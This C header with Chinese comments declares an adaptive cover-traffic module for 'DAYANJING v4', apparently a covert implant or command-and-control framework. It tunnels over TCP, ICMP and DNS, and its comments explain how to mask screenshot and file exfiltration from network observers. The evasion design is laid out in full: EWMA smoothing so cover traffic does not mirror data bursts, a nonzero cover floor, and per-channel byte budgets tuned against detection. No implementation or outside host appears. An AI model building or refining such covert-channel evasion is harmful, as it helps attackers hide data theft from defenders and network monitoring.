/*
 * DAYANJING v4 — p2p_cover.h
 *
 * 自适应覆盖流量（adaptive cover traffic）。
 *
 * ====================================================================
 * 被解除的限制
 * ====================================================================
 * 旧实现 p2p_cell_cover_due(sc, idle_ms, rate_per_min, ...) 的 rate_per_min
 * 是一个**调用方传入的常量**。这留下两个真实问题：
 *
 *   问题一（速率不可自适应）：
 *     数据突发时，线上总速率 = 数据速率 + 固定覆盖速率 —— 总速率随之暴涨，
 *     观察者看到"流量突然变大"就知道有批量传输（截图/文件回传）。
 *     反之空闲时总速率固定，与"有数据"时期差异明显，形成二元指纹。
 *
 *   问题二（信道成本未计入）：
 *     512 字节信元在直连 TCP 上是 512 字节；在 DNS 隧道上要拆成
 *     ceil(512/100) = 6 个查询，每个查询还要带应答，实测约 2 KB。
 *     用同一个 rate_per_min 跑 DNS 信道，等于把 DNS 信道的字节开销
 *     放大约 4 倍 —— 低速信道会被覆盖流量直接打满。
 *
 * 本模块把覆盖速率从"常量"改为**由两个实测/配置量推导**：
 *
 *     target_total = budget_bytes_per_min / bytes_per_cell
 *     cover_rate   = clamp(target_total - measured_data_rate, min, max)
 *
 * 于是：
 *   - 数据突发 => measured 上升 => cover 自动下降，线上总速率趋于恒定
 *   - 空闲     => measured 下降 => cover 自动升到上限，维持基线流量
 *   - 换信道   => bytes_per_cell 变化 => target_total 自动缩放
 *
 * ====================================================================
 * 为什么用 EWMA 而不是瞬时值
 * ====================================================================
 * 若 cover_rate 直接取 (target - 瞬时数据速率)，覆盖速率会与数据速率
 * **逐包负相关**，观察者只要看覆盖流量就能反推出数据流量 —— 等于把
 * 隐蔽信道变成了侧信道。EWMA 让覆盖速率只对"持续的趋势"响应，
 * 对单包突发不响应，切断这种相关性。
 *
 * ====================================================================
 * 为什么保留 min_cover（下限不为 0）
 * ====================================================================
 * 若数据满额时覆盖降到 0，"数据忙 => 无覆盖信元"本身就成为可观测特征。
 * 保留一个小的下限，使任何时刻线上都有覆盖流量，只是占比不同。
 *
 * ====================================================================
 * 定点约定
 * ====================================================================
 * 速率一律用「信元/分钟」的整数表示，EWMA 内部放大 16 倍（x16）保精度，
 * 对外取整输出。所有除法先判零。
 */

#ifndef DAYANJING_P2P_COVER_H
#define DAYANJING_P2P_COVER_H

#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

/* 信道画像：决定一个信元在线上实际消耗多少字节 */
#define P2P_COVER_PROFILE_DIRECT  0   /* 直连 TCP：1 信元 ≈ 512 B */
#define P2P_COVER_PROFILE_ICMP    1   /* ICMP 隧道：1 信元 ≈ 1 个回显往返 */
#define P2P_COVER_PROFILE_DNS     2   /* DNS 隧道：1 信元 ≈ 6 个查询+应答 */

/* 默认每信元线上字节数（可由实测值覆盖，见 p2p_cover_set_measured_cost） */
#define P2P_COVER_COST_DIRECT  552u
#define P2P_COVER_COST_ICMP   1112u
#define P2P_COVER_COST_DNS    2040u

/* 默认下限：即使数据满额也维持的覆盖速率（信元/分钟） */
#define P2P_COVER_DEFAULT_MIN     2u
/* 默认上限：单靠覆盖能达到的最大速率（信元/分钟） */
#define P2P_COVER_DEFAULT_MAX   600u

/* 窗口长度：EWMA 每 WINDOW_US 推进一次 */
#define P2P_COVER_WINDOW_US  (5u * 1000000u)   /* 5 秒 */

typedef struct {
    uint32_t budget_bytes_per_min;  /* 信道字节预算（操作员按带宽/检测面设定） */
    uint32_t min_cover_per_min;     /* 覆盖下限 */
    uint32_t max_cover_per_min;     /* 覆盖上限 */

    uint32_t profile;               /* P2P_COVER_PROFILE_* */
    uint32_t bytes_per_cell;        /* 本信道一个信元的线上字节成本 */

    uint32_t ewma_data_x16;         /* 实测数据速率 EWMA（信元/分钟，定点 x16） */
    uint64_t win_start_us;          /* 当前统计窗口起点 */
    uint32_t win_data_cells;        /* 当前窗口内数据信元数 */

    uint32_t last_rate;             /* 上次算出的覆盖速率，供观察/测试 */
    uint64_t total_cover_cells;     /* 累计发出的覆盖信元 */
    int      inited;
} p2p_cover_t;

/*
 * 初始化。budget_bytes_per_min 为 0 表示禁用覆盖流量。
 * 时间基准由调用方注入（now_us），本模块不读系统时钟 —— 与 QoS/调度层一致，
 * 这样测试可以把时间推进到任意点，不需要 sleep。
 */
int p2p_cover_init(p2p_cover_t *cov, uint32_t profile,
                   uint32_t budget_bytes_per_min, uint64_t now_us);

/* 切换信道画像（会重算 bytes_per_cell） */
int p2p_cover_set_profile(p2p_cover_t *cov, uint32_t profile);

/*
 * 用实测成本覆盖画像默认值。
 * 真实部署应先跑一轮真实分片测出 bytes_per_cell 再回填 —— 画像默认值
 * 是量级估计，不是精确值。
 */
int p2p_cover_set_measured_cost(p2p_cover_t *cov, uint32_t bytes_per_cell);

/* 设置字节预算；0 = 禁用覆盖 */
int p2p_cover_set_budget(p2p_cover_t *cov, uint32_t budget_bytes_per_min);

/* 设置覆盖速率的上下限（clamp 区间） */
int p2p_cover_set_bounds(p2p_cover_t *cov, uint32_t min_per_min,
                         uint32_t max_per_min);

/*
 * 记录一次数据发送。n_cells 为本批数据占用的信元数（0 视为无效调用）。
 * 必须在发送**之后**调用，且用与 tick 相同的时间基准。
 */
int p2p_cover_note_data(p2p_cover_t *cov, uint32_t n_cells, uint64_t now_us);

/*
 * 推进窗口并更新 EWMA。应在每次发送判决前调用。
 * 返回本次是否为窗口边界（边界处 EWMA 被更新）。
 */
int p2p_cover_tick(p2p_cover_t *cov, uint64_t now_us);

/* 当前实测数据速率（信元/分钟，取整） */
uint32_t p2p_cover_data_rate(p2p_cover_t *cov);

/* 目标线上总速率（信元/分钟）= 预算 / 单信元成本 */
uint32_t p2p_cover_target_total(p2p_cover_t *cov);

/*
 * 自适应覆盖速率（信元/分钟）= clamp(目标总速率 - 实测数据速率, min, max)。
 * 这是本模块的核心输出。
 */
uint32_t p2p_cover_rate(p2p_cover_t *cov);

/*
 * 发送判决：给定自上次发送以来的空闲时长，返回 1 表示此刻应发一个覆盖信元。
 * out_delay 给出建议延迟（ms）。含随机性 —— 同样的空闲时长不总得出同样结论。
 */
int p2p_cover_due(p2p_cover_t *cov, uint32_t *seed, uint32_t idle_ms,
                  uint32_t *out_delay);

/*
 * 记账：本分钟线上预计总字节数（数据 + 覆盖）。
 * 用于验证"换信道后总开销确实被预算约束住"。
 */
uint32_t p2p_cover_projected_bytes_per_min(p2p_cover_t *cov);

const char *p2p_cover_errstr(int e);

#ifdef __cplusplus
}
#endif

#endif /* DAYANJING_P2P_COVER_H */
